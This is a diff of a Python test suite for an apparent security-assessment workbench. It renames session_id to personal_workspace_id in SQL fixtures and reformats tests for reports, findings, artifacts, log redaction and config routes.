-                    f"fnd_report_page_{fixture_suffix}_{index:03d}",
-                    session_id,
+            run_rows.append(
+                (
                     run_id,
-                    "finding",
-                    f"Report selector redirect finding {index:03d}",
-                    f"https://example.test/redirect/{index:03d}",
-                    "medium",
-                    f"fp-report-page-{fixture_suffix}-{index:03d}",
+                    session_id,
+                    "external",
+                    "",
+                    f"echo report page run {index:03d}",
                     started,
-                ))
+                    "[]",
+                    0,
+                )
+            )
+            link_rows.append(
+                (
+                    f"pln_report_page_{fixture_suffix}_{index:03d}",
+                    project["id"],
+                    "run",
+                    run_id,
+                    "manual",
+                    started,
+                )
+            )
+            if index in {0, 10, 504}:
+                finding_rows.append(
+                    (
+                        f"fnd_report_page_{fixture_suffix}_{index:03d}",
+                        session_id,
+                        run_id,
+                        "finding",
+                        f"Report selector redirect finding {index:03d}",
+                        f"https://example.test/redirect/{index:03d}",
+                        "medium",
+                        f"fp-report-page-{fixture_suffix}-{index:03d}",
+                        started,
+                    )
+                )
         with sqlite3.connect(DB_PATH) as conn:
             conn.executemany(
                 "INSERT INTO runs "
-                "(id, session_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
+                "(id, personal_workspace_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 run_rows,
             )
             conn.executemany(
-                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
-                "VALUES (?, ?, ?, ?, ?, ?)",
+                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) VALUES (?, ?, ?, ?, ?, ?)",
                 link_rows,
             )
             conn.executemany(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, severity, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, severity, fingerprint, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                 finding_rows,
             )
@@ -12708,8 +12904,7 @@ class TestProjectRoutes:
         )
         assert finding_preview_resp.status_code == 200
         finding_preview_text = (
-            finding_preview_resp.get_json()["preview"]["markdown"]
-            + finding_preview_resp.get_json()["preview"]["html"]
+            finding_preview_resp.get_json()["preview"]["markdown"] + finding_preview_resp.get_json()["preview"]["html"]
         )
         assert "Report selector redirect finding 504" in finding_preview_text
         assert "Report selector redirect finding 000" not in finding_preview_text
@@ -12728,7 +12923,7 @@ class TestProjectRoutes:
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, target_id, scope, title, raw_line, severity, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, target_id, scope, title, raw_line, severity, fingerprint, created) "
                 "VALUES (?, ?, ?, ?, 'finding', 'Reference follows finding', ?, 'medium', ?, datetime('now'))",
                 (
                     referenced_finding_id,
@@ -12824,68 +13019,80 @@ class TestProjectRoutes:
             artifact_id = f"rfa_report_nonrun_{fixture_suffix}_{index:03d}"
             artifact_path = f"reports/selector-artifact-{fixture_suffix}-{index:03d}.txt"
             artifact_text = f"selector artifact body {fixture_suffix} {index:03d}\n"
-            run_rows.append((
-                run_id,
-                session_id,
-                "external",
-                "",
-                f"echo selector seed {fixture_suffix} {index:03d}",
-                started,
-                "[]",
-                0,
-            ))
-            link_rows.append((
-                f"pln_report_nonrun_{fixture_suffix}_{index:03d}",
-                project["id"],
-                "run",
-                run_id,
-                "manual",
-                started,
-            ))
-            target_rows.append((
-                target_id,
-                session_id,
-                "domain",
-                target_value,
-                f"sig-report-nonrun-{fixture_suffix}-{index:03d}",
-                started,
-                started,
-                started,
-            ))
-            target_link_rows.append((
-                f"ple_report_nonrun_{fixture_suffix}_{index:03d}",
-                project["id"],
-                "atlas_entity",
-                target_id,
-                "manual",
-                started,
-            ))
-            finding_rows.append((
-                finding_id,
-                session_id,
-                run_id,
-                target_id,
-                "finding",
-                f"Selector backend finding {fixture_suffix} {index:03d}",
-                f"selector backend raw finding {fixture_suffix} {index:03d}",
-                "medium",
-                f"fp-report-nonrun-{fixture_suffix}-{index:03d}",
-                started,
-            ))
-            artifact_rows.append((
-                artifact_id,
-                session_id,
-                run_id,
-                artifact_path,
-                f"selector-artifact-{fixture_suffix}-{index:03d}.txt",
-                "output",
-                len(artifact_text.encode("utf-8")),
-                "workspace_flag",
-                "text/plain",
-                "text",
-                hashlib.sha256(artifact_text.encode("utf-8")).hexdigest(),
-                started,
-            ))
+            run_rows.append(
+                (
+                    run_id,
+                    session_id,
+                    "external",
+                    "",
+                    f"echo selector seed {fixture_suffix} {index:03d}",
+                    started,
+                    "[]",
+                    0,
+                )
+            )
+            link_rows.append(
+                (
+                    f"pln_report_nonrun_{fixture_suffix}_{index:03d}",
+                    project["id"],
+                    "run",
+                    run_id,
+                    "manual",
+                    started,
+                )
+            )
+            target_rows.append(
+                (
+                    target_id,
+                    session_id,
+                    "domain",
+                    target_value,
+                    f"sig-report-nonrun-{fixture_suffix}-{index:03d}",
+                    started,
+                    started,
+                    started,
+                )
+            )
+            target_link_rows.append(
+                (
+                    f"ple_report_nonrun_{fixture_suffix}_{index:03d}",
+                    project["id"],
+                    "atlas_entity",
+                    target_id,
+                    "manual",
+                    started,
+                )
+            )
+            finding_rows.append(
+                (
+                    finding_id,
+                    session_id,
+                    run_id,
+                    target_id,
+                    "finding",
+                    f"Selector backend finding {fixture_suffix} {index:03d}",
+                    f"selector backend raw finding {fixture_suffix} {index:03d}",
+                    "medium",
+                    f"fp-report-nonrun-{fixture_suffix}-{index:03d}",
+                    started,
+                )
+            )
+            artifact_rows.append(
+                (
+                    artifact_id,
+                    session_id,
+                    run_id,
+                    artifact_path,
+                    f"selector-artifact-{fixture_suffix}-{index:03d}.txt",
+                    "output",
+                    len(artifact_text.encode("utf-8")),
+                    "workspace_flag",
+                    "text/plain",
+                    "text",
+                    hashlib.sha256(artifact_text.encode("utf-8")).hexdigest(),
+                    started,
+                )
+            )
             artifact_expected_text[artifact_id] = artifact_text.strip()
             with mock.patch.dict(shell_app_module.CFG, workspace_cfg, clear=False):
                 resolve_workspace_path(session_id, artifact_path, shell_app_module.CFG, ensure_parent=True).write_text(
@@ -12895,35 +13102,33 @@ class TestProjectRoutes:
         with sqlite3.connect(DB_PATH) as conn:
             conn.executemany(
                 "INSERT INTO runs "
-                "(id, session_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
+                "(id, personal_workspace_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 run_rows,
             )
             conn.executemany(
-                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
-                "VALUES (?, ?, ?, ?, ?, ?)",
+                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) VALUES (?, ?, ?, ?, ?, ?)",
                 link_rows,
             )
             conn.executemany(
                 "INSERT INTO entities "
-                "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
+                "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 target_rows,
             )
             conn.executemany(
-                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
-                "VALUES (?, ?, ?, ?, ?, ?)",
+                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) VALUES (?, ?, ?, ?, ?, ?)",
                 target_link_rows,
             )
             conn.executemany(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, target_id, scope, title, raw_line, severity, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, target_id, scope, title, raw_line, severity, fingerprint, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                 finding_rows,
             )
             conn.executemany(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                 "content_type, preview_type, content_sha256, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                 artifact_rows,
@@ -13046,10 +13251,7 @@ class TestProjectRoutes:
                 try:
                     with zipfile.ZipFile(archive_result["path"]) as archive:
                         manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
-                        archive_text = (
-                            archive.read("report.md").decode("utf-8")
-                            + archive.read("report.html").decode("utf-8")
-                        )
+                        archive_text = archive.read("report.md").decode("utf-8") + archive.read("report.html").decode("utf-8")
                 finally:
                     try:
                         os.unlink(archive_result["path"])
@@ -13116,7 +13318,8 @@ class TestProjectRoutes:
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, target_id, scope, title, severity, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, target_id, scope, title, severity, "
+                "raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, ?, 'finding', 'token leak', 'high', ?, 0, ?, datetime('now'))",
                 (
                     finding_id,
@@ -13129,7 +13332,7 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                 "content_type, preview_type, content_sha256, created) "
                 "VALUES (?, ?, ?, 'reports/secrets.txt', 'secrets.txt', 'output', ?, "
                 "'workspace_flag', 'text/plain', 'text', ?, datetime('now'))",
@@ -13137,7 +13340,7 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'finding', ?, 'Finding private note should stay out', datetime('now'), datetime('now'))",
                 (f"note_fnd_{run_id}", session_id, finding_id),
             )
@@ -13221,7 +13424,7 @@ class TestProjectRoutes:
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                 "VALUES (?, ?, ?, 'reports/nuclei.json', 'nuclei.json', 'output', 42, "
                 "'workspace_flag', datetime('now'))",
                 (artifact_id, session_id, run_id),
@@ -13298,50 +13501,56 @@ class TestProjectRoutes:
         good_path = "captures/app.png"
         conflict_path = "captures/conflict.png"
         previous_path = "previous-captures/app.png"
-        preview = [{
-            "text": "https://app.example.test/login [200]",
-            "source_detail": {
-                "screenshots": [
-                    {
-                        "url": "https://app.example.test/login",
-                        "artifact_path": good_path,
-                        "status_code": 200,
-                        "title": "Sign in",
-                        "technologies": ["nginx"],
-                        "captured_at": "2026-08-07T00:00:02Z",
-                        "visual_hash": "visual-good",
-                        "source_run_id": run_id,
-                        "profile_role": "authenticated",
-                        "captured_html": "<script>must not leave the run</script>",
-                    },
-                    {
-                        "url": "https://app.example.test/one",
-                        "artifact_path": conflict_path,
-                        "source_run_id": run_id,
-                    },
-                    {
-                        "url": "https://app.example.test/two",
-                        "artifact_path": conflict_path,
-                        "source_run_id": run_id,
-                    },
-                ],
-            },
-        }]
-        previous_preview = [{
-            "source_detail": {
-                "screenshots": [{
-                    "url": "https://app.example.test/login",
-                    "artifact_path": previous_path,
-                    "status_code": 200,
-                    "title": "Sign in",
-                    "technologies": ["nginx"],
-                    "captured_at": "2026-08-06T00:00:02Z",
-                    "visual_hash": "visual-previous",
-                    "source_run_id": previous_run_id,
-                    "profile_role": "authenticated",
-                }],
-            },
-        }]
+        preview = [
+            {
+                "text": "https://app.example.test/login [200]",
+                "source_detail": {
+                    "screenshots": [
+                        {
+                            "url": "https://app.example.test/login",
+                            "artifact_path": good_path,
+                            "status_code": 200,
+                            "title": "Sign in",
+                            "technologies": ["nginx"],
+                            "captured_at": "2026-08-07T00:00:02Z",
+                            "visual_hash": "visual-good",
+                            "source_run_id": run_id,
+                            "profile_role": "authenticated",
+                            "captured_html": "<script>must not leave the run</script>",
+                        },
+                        {
+                            "url": "https://app.example.test/one",
+                            "artifact_path": conflict_path,
+                            "source_run_id": run_id,
+                        },
+                        {
+                            "url": "https://app.example.test/two",
+                            "artifact_path": conflict_path,
+                            "source_run_id": run_id,
+                        },
+                    ],
+                },
+            }
+        ]
+        previous_preview = [
+            {
+                "source_detail": {
+                    "screenshots": [
+                        {
+                            "url": "https://app.example.test/login",
+                            "artifact_path": previous_path,
+                            "status_code": 200,
+                            "title": "Sign in",
+                            "technologies": ["nginx"],
+                            "captured_at": "2026-08-06T00:00:02Z",
+                            "visual_hash": "visual-previous",
+                            "source_run_id": previous_run_id,
+                            "profile_role": "authenticated",
+                        }
+                    ],
+                },
+            }
+        ]
         workspace_cfg = {
             "workspace_enabled": True,
             "workspace_root": str(tmp_path / "workspaces"),
@@ -13367,7 +13576,7 @@ class TestProjectRoutes:
                 )
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, "
                     "last_seen_at, occurrence_count, created) "
                     "VALUES (?, ?, 'domain', 'app.example.test', ?, ?, ?, 1, ?)",
                     (
@@ -13381,7 +13590,7 @@ class TestProjectRoutes:
                 )
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, host_entity_id, "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, host_entity_id, "
                     "first_seen_at, last_seen_at, occurrence_count, created) "
                     "VALUES (?, ?, 'url', 'https://app.example.test/login', ?, ?, ?, ?, 1, ?)",
                     (
@@ -13405,7 +13614,7 @@ class TestProjectRoutes:
                 )
                 conn.executemany(
                     "INSERT INTO run_file_artifacts "
-                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
+                    "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, "
                     "detected_by, content_type, preview_type, content_sha256, created) "
                     "VALUES (?, ?, ?, ?, ?, 'screenshot', ?, 'httpx_screenshot', "
                     "'image/png', 'image', ?, ?)",
@@ -13444,7 +13653,7 @@ class TestProjectRoutes:
                 )
                 conn.execute(
                     "INSERT INTO run_file_artifacts "
-                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
+                    "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, "
                     "detected_by, content_type, preview_type, created) "
                     "VALUES (?, ?, ?, 'captures/readme.txt', 'readme.txt', 'output', 1, "
                     "'workspace_flag', 'text/plain', 'text', ?)",
@@ -13466,15 +13675,18 @@ class TestProjectRoutes:
                 headers={"X-Session-ID": session_id},
             )
             filtered = client.get(
-                f"/projects/{project['id']}/web-surface?" + urlencode({
-                    "target": "APP.EXAMPLE",
-                    "status_code": "200",
-                    "technology": "NGINX",
-                    "profile_role": "AUTHENTICATED",
-                    "visual_hash": "VISUAL-GOOD",
-                    "change_state": "CHANGED",
-                    "limit": "1",
-                }),
+                f"/projects/{project['id']}/web-surface?"
+                + urlencode(
+                    {
+                        "target": "APP.EXAMPLE",
+                        "status_code": "200",
+                        "technology": "NGINX",
+                        "profile_role": "AUTHENTICATED",
+                        "visual_hash": "VISUAL-GOOD",
+                        "change_state": "CHANGED",
+                        "limit": "1",
+                    }
+                ),
                 headers={"X-Session-ID": session_id},
             )
             with mock.patch("services.projects.web_surface.MAX_GALLERY_ROWS", 1):
@@ -13563,16 +13775,16 @@ class TestProjectRoutes:
 
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+                "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                 (other_run_id, other_session, "dig darklab.sh"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, run_kind, command, started) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started) "
                 "VALUES (?, ?, 'builtin', ?, datetime('now'))",
                 (builtin_run_id, session_id, "project list"),
             )
             conn.execute(
-                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
+                "INSERT INTO snapshots (id, personal_workspace_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                 (f"{session_id}-snapshot", session_id, "snapshot", "[]"),
             )
             conn.commit()
@@ -13597,8 +13809,7 @@ class TestProjectRoutes:
         assert workspace_file_link.status_code == 400
         assert "do not support" in json.loads(workspace_file_link.data)["error"]
 
-
-# ── /log ──────────────────────────────────────────────────────────────────────
+    # ── /log ──────────────────────────────────────────────────────────────────────
 
     def test_manual_findings_keep_stable_identity_and_bounded_line_evidence(self):
         client = get_client()
@@ -13628,12 +13839,14 @@ class TestProjectRoutes:
             "cve_ids": ["CVE-2026-12345"],
             "cwe_ids": ["CWE-306"],
             "references": ["https://example.test/advisories/CVE-2026-12345"],
-            "evidence": [{
-                "evidence_type": "run_line",
-                "evidence_id": run_id,
-                "line_number": 1,
-                "snippet": "443/tcp open https - admin console",
-            }],
+            "evidence": [
+                {
+                    "evidence_type": "run_line",
+                    "evidence_id": run_id,
+                    "line_number": 1,
+                    "snippet": "443/tcp open https - admin console",
+                }
+            ],
         }
         created_resp = client.post(
             f"/projects/{project['id']}/findings",
@@ -13700,17 +13913,13 @@ class TestProjectRoutes:
             f"/projects/{project['id']}/findings",
             headers={"X-Session-ID": session_id},
         )
-        listed = next(
-            item for item in findings_resp.get_json()["findings"]
-            if item["id"] == created["id"]
-        )
+        listed = next(item for item in findings_resp.get_json()["findings"] if item["id"] == created["id"])
         assert listed["manual_revision"] == 2
         assert listed["orphan_source"] is False
         with sqlite3.connect(DB_PATH) as conn:
             conn.row_factory = sqlite3.Row
             occurrence = conn.execute(
-                "SELECT line_number, snippet, observed_severity FROM findings_occurrences "
-                "WHERE finding_id = ?",
+                "SELECT line_number, snippet, observed_severity FROM findings_occurrences WHERE finding_id = ?",
                 (created["id"],),
             ).fetchone()
             cve_link = conn.execute(
@@ -13744,17 +13953,20 @@ class TestClientLogRoute:
     def test_accepts_client_error_payload(self):
         client = get_client()
         with mock.patch.object(shell_assets.log, "warning") as mock_warning:
-            resp = client.post("/log", json={
-                "context": "session-token set",
-                "message": "ReferenceError: global is not defined",
-                "details": {
-                    "selection_key": "run_ids",
-                    "offset": 50,
-                    "filter_fields": ["q"],
-                    "filter_active": {"q": True},
-                    "q": "sensitive search text",
+            resp = client.post(
+                "/log",
+                json={
+                    "context": "session-token set",
+                    "message": "ReferenceError: global is not defined",
+                    "details": {
+                        "selection_key": "run_ids",
+                        "offset": 50,
+                        "filter_fields": ["q"],
+                        "filter_active": {"q": True},
+                        "q": "sensitive search text",
+                    },
                 },
-            })
+            )
         assert resp.status_code == 200
         assert resp.get_json() == {"ok": True}
         mock_warning.assert_called_once()
@@ -13771,12 +13983,15 @@ class TestClientLogRoute:
         assert "sensitive search text" not in json.dumps(extra)
 
         with mock.patch.object(shell_assets.log, "debug") as mock_debug:
-            debug_resp = client.post("/log", json={
-                "event": "TEAM_SCOPE_CHANGED",
-                "level": "debug",
-                "context": "TEAM_SCOPE_CHANGED",
-                "message": '{"scope":"team"}',
-            })
+            debug_resp = client.post(
+                "/log",
+                json={
+                    "event": "TEAM_SCOPE_CHANGED",
+                    "level": "debug",
+                    "context": "TEAM_SCOPE_CHANGED",
+                    "message": '{"scope":"team"}',
+                },
+            )
         assert debug_resp.status_code == 200
         mock_debug.assert_called_once()
         assert mock_debug.call_args[0][0] == "TEAM_SCOPE_CHANGED"
@@ -13785,35 +14000,36 @@ class TestClientLogRoute:
         assert debug_extra["client_message"] == '{"scope":"team"}'
 
         with mock.patch.object(shell_assets.log, "error") as mock_error:
-            assessment_resp = client.post("/log", json={
-                "event": "PROJECT_ASSESSMENT_CLIENT_ZAP_JOB_REFRESH_FAILED",
-                "level": "error",
-                "context": "PROJECT_ASSESSMENT_CLIENT_ZAP_JOB_REFRESH_FAILED",
-                "message": "Internal server error",
-                "details": {
-                    "page": "project_assessment",
-                    "phase": "zap_job_refresh",
-                    "project_id": "prj_1",
-                    "assessment_id": "asm_1",
-                    "check_id": "ach_1",
-                    "correlation_id": "ocr_1",
-                    "job_id": "zaj_1",
-                    "profile_key": "web",
-                    "status": 500,
-                    "assessment_check_id": "legacy-check-id",
-                    "zap_job_id": "legacy-job-id",
-                    "target_value": "https://private.example.test",
-                    "callback_url": "https://callback.example.test",
-                    "command": "secret command",
-                    "response_body": "private response",
-                    "finding_text": "private finding",
+            assessment_resp = client.post(
+                "/log",
+                json={
+                    "event": "PROJECT_ASSESSMENT_CLIENT_ZAP_JOB_REFRESH_FAILED",
+                    "level": "error",
+                    "context": "PROJECT_ASSESSMENT_CLIENT_ZAP_JOB_REFRESH_FAILED",
+                    "message": "Internal server error",
+                    "details": {
+                        "page": "project_assessment",
+                        "phase": "zap_job_refresh",
+                        "project_id": "prj_1",
+                        "assessment_id": "asm_1",
+                        "check_id": "ach_1",
+                        "correlation_id": "ocr_1",
+                        "job_id": "zaj_1",
+                        "profile_key": "web",
+                        "status": 500,
+                        "assessment_check_id": "legacy-check-id",
+                        "zap_job_id": "legacy-job-id",
+                        "target_value": "https://private.example.test",
+                        "callback_url": "https://callback.example.test",
+                        "command": "secret command",
+                        "response_body": "private response",
+                        "finding_text": "private finding",
+                    },
                 },
-            })
+            )
         assert assessment_resp.status_code == 200
         mock_error.assert_called_once()
-        assert mock_error.call_args.args == (
-            "PROJECT_ASSESSMENT_CLIENT_ZAP_JOB_REFRESH_FAILED",
-        )
+        assert mock_error.call_args.args == ("PROJECT_ASSESSMENT_CLIENT_ZAP_JOB_REFRESH_FAILED",)
         assessment_extra = mock_error.call_args.kwargs["extra"]
         assert assessment_extra["client_details"] == {
             "assessment_id": "asm_1",
@@ -13846,11 +14062,14 @@ class TestClientLogRoute:
             mock.patch.object(shell_assets.log, "error") as mock_error,
         ):
             for level in ("debug", "info", "warn", "warning", "error", "unknown"):
-                resp = client.post("/log", json={
-                    "event": "CLIENT_LEVEL_TEST",
-                    "level": level,
-                    "context": f"level-{level}",
-                })
+                resp = client.post(
+                    "/log",
+                    json={
+                        "event": "CLIENT_LEVEL_TEST",
+                        "level": level,
+                        "context": f"level-{level}",
+                    },
+                )
                 assert resp.status_code == 200
 
         assert len([call for call in mock_debug.call_args_list if call.args[0] == "CLIENT_LEVEL_TEST"]) == 1
@@ -13868,52 +14087,52 @@ class TestClientLogRoute:
     def test_accepts_safe_asset_failure_context_without_query_values(self):
         client = get_client()
         with mock.patch.object(shell_assets.log, "error") as mock_error:
-            resp = client.post("/log", json={
-                "event": "ESM_BOOTSTRAP_LOAD_FAILED",
-                "level": "error",
-                "context": "ESM_BOOTSTRAP_LOAD_FAILED",
-                "message": (
-                    "failed to load "
-                    "http://localhost/static/build/shell-bootstrap.123456789abc.js?v=abc123&token=secret"
-                ),
-                "details": {
-                    "page": "index",
-                    "bundle": "shell-bootstrap",
-                    "src": "http://localhost/static/build/shell-bootstrap.123456789abc.js?v=abc123&token=secret",
-                    "phase": "load",
-                    "asset_name": "shell-bootstrap",
-                    "asset_type": "module",
-                    "artifact_id": "rfa_project_artifact_123",
-                    "error_name": "TypeError",
-                    "export_name": "DarklabProjectWorkspaceShell",
-                    "controller_name": "createProjectWorkspaceShellController",
-                    "module_keys": ["DarklabProjectWorkspaceShell", "helper"],
-                    "operation": "loadProjectWorkspace",
-                    "route": "/projects",
-                    "left_run_id": "run-left-123",
-                    "right_run_id": "run-right-456",
-                    "status": 404,
-                    "lookup_mode": "auto",
-                    "scope_kind": "project",
-                    "detected_type": "url",
-                    "match_state": "not_found",
-                    "request_seq": 7,
-                    "candidate_count": 2,
-                    "project_scoped": True,
-                    "parent_candidate": True,
-                    "compare_request_error": True,
-                    "expected_global": True,
-                    "url_path": "/history/compare?q=sensitive-search",
-                    "raw_artifact_path": "/private/workspace/secret.txt",
+            resp = client.post(
+                "/log",
+                json={
+                    "event": "ESM_BOOTSTRAP_LOAD_FAILED",
+                    "level": "error",
+                    "context": "ESM_BOOTSTRAP_LOAD_FAILED",
+                    "message": (
+                        "failed to load http://localhost/static/build/shell-bootstrap.123456789abc.js?v=abc123&token=secret"
+                    ),
+                    "details": {
+                        "page": "index",
+                        "bundle": "shell-bootstrap",
+                        "src": "http://localhost/static/build/shell-bootstrap.123456789abc.js?v=abc123&token=secret",
+                        "phase": "load",
+                        "asset_name": "shell-bootstrap",
+                        "asset_type": "module",
+                        "artifact_id": "rfa_project_artifact_123",
+                        "error_name": "TypeError",
+                        "export_name": "DarklabProjectWorkspaceShell",
+                        "controller_name": "createProjectWorkspaceShellController",
+                        "module_keys": ["DarklabProjectWorkspaceShell", "helper"],
+                        "operation": "loadProjectWorkspace",
+                        "route": "/projects",
+                        "left_run_id": "run-left-123",
+                        "right_run_id": "run-right-456",
+                        "status": 404,
+                        "lookup_mode": "auto",
+                        "scope_kind": "project",
+                        "detected_type": "url",
+                        "match_state": "not_found",
+                        "request_seq": 7,
+                        "candidate_count": 2,
+                        "project_scoped": True,
+                        "parent_candidate": True,
+                        "compare_request_error": True,
+                        "expected_global": True,
+                        "url_path": "/history/compare?q=sensitive-search",
+                        "raw_artifact_path": "/private/workspace/secret.txt",
+                    },
                 },
-            })
+            )
         assert resp.status_code == 200
         mock_error.assert_called_once()
         assert mock_error.call_args[0][0] == "ESM_BOOTSTRAP_LOAD_FAILED"
         extra = mock_error.call_args.kwargs["extra"]
-        assert extra["client_message"] == (
-            "failed to load /static/build/shell-bootstrap.123456789abc.js?v=abc123"
-        )
+        assert extra["client_message"] == ("failed to load /static/build/shell-bootstrap.123456789abc.js?v=abc123")
         assert extra["client_details"] == {
             "asset_name": "shell-bootstrap",
             "asset_type": "module",
@@ -13947,6 +14166,7 @@ class TestClientLogRoute:
 
 
 # ── /status ───────────────────────────────────────────────────────────────────
+
 
 class TestStatusRoute:
     def test_returns_200_even_when_db_fails(self):
@@ -13983,10 +14203,13 @@ class TestStatusRoute:
 
     def test_status_keeps_db_ok_when_periodic_audit_retention_fails(self):
         client = get_client()
-        with mock.patch(
-            "services.assets.diagnostics.maybe_prune_events",
-            side_effect=RuntimeError("retention failed"),
-        ), mock.patch.object(shell_assets.log, "warning") as warning:
+        with (
+            mock.patch(
+                "services.assets.diagnostics.maybe_prune_events",
+                side_effect=RuntimeError("retention failed"),
+            ),
+            mock.patch.object(shell_assets.log, "warning") as warning,
+        ):
             data = json.loads(client.get("/status").data)
         assert data["db"] == "ok"
         warning.assert_called_once()
@@ -14030,6 +14253,7 @@ class TestStatusRoute:
 
 # ── /config ───────────────────────────────────────────────────────────────────
 
+
 class TestConfigRoute:
     def test_returns_200(self):
         client = get_client()
@@ -14040,11 +14264,20 @@ class TestConfigRoute:
         client = get_client()
         data = json.loads(client.get("/config").data)
         for key in (
-            "app_name", "project_source", "prompt_username", "prompt_domain", "default_theme",
-            "max_tabs", "max_output_lines", "high_volume_output_line_threshold",
-            "high_volume_output_status_interval_lines", "evidence_package_max_mb",
-            "evidence_package_max_uncompressed_mb", "evidence_package_max_artifacts",
-            "workspace_enabled", "interactive_pty_commands",
+            "app_name",
+            "project_source",
+            "prompt_username",
+            "prompt_domain",
+            "default_theme",
+            "max_tabs",
+            "max_output_lines",
+            "high_volume_output_line_threshold",
+            "high_volume_output_status_interval_lines",
+            "evidence_package_max_mb",
+            "evidence_package_max_uncompressed_mb",
+            "evidence_package_max_artifacts",
+            "workspace_enabled",
+            "interactive_pty_commands",
             "assessment_intrusive_actions_enabled",
             "assessment_batch_limits",
             "scheduler_default_timezone",
@@ -14064,34 +14297,38 @@ class TestConfigRoute:
     def test_interactive_pty_commands_reflect_registry(self):
         client = get_client()
         registry = {
-            "commands": [{
-                "root": "watcher",
-                "interactive": {
-                    "mode": "pty",
-                    "trigger_flag": "--live",
-                    "default_rows": 35,
-                    "default_cols": 120,
-                    "max_runtime_seconds": 180,
-                    "allow_input": False,
-                    "requires_args": False,
-                },
-            }],
+            "commands": [
+                {
+                    "root": "watcher",
+                    "interactive": {
+                        "mode": "pty",
+                        "trigger_flag": "--live",
+                        "default_rows": 35,
+                        "default_cols": 120,
+                        "max_runtime_seconds": 180,
+                        "allow_input": False,
+                        "requires_args": False,
+                    },
+                }
+            ],
             "pipe_helpers": [],
         }
         with mock.patch("services.commands.registry.load_commands_registry", return_value=registry):
             data = json.loads(client.get("/config").data)
 
-        assert data["interactive_pty_commands"] == [{
-            "root": "watcher",
-            "trigger_flag": "--live",
-            "default_rows": 35,
-            "default_cols": 120,
-            "max_runtime_seconds": 180,
-            "allow_input": False,
-            "requires_args": False,
-            "transcript_mode": "final_frame",
-            "input_safety": "no_input",
-        }]
+        assert data["interactive_pty_commands"] == [
+            {
+                "root": "watcher",
+                "trigger_flag": "--live",
+                "default_rows": 35,
+                "default_cols": 120,
+                "max_runtime_seconds": 180,
+                "allow_input": False,
+                "requires_args": False,
+                "transcript_mode": "final_frame",
+                "input_safety": "no_input",
+            }
+        ]
 
     def test_workspace_menu_affordances_follow_config(self):
         client = get_client()
@@ -14113,24 +14350,41 @@ class TestConfigRoute:
     def test_contains_timeout_and_welcome_keys(self):
         client = get_client()
         data = json.loads(client.get("/config").data)
-        for key in ("command_timeout_seconds",
-                    "welcome_char_ms", "welcome_jitter_ms",
-                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
-                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
-                    "welcome_sample_count", "welcome_status_labels",
-                    "welcome_hint_interval_ms", "welcome_hint_rotations",
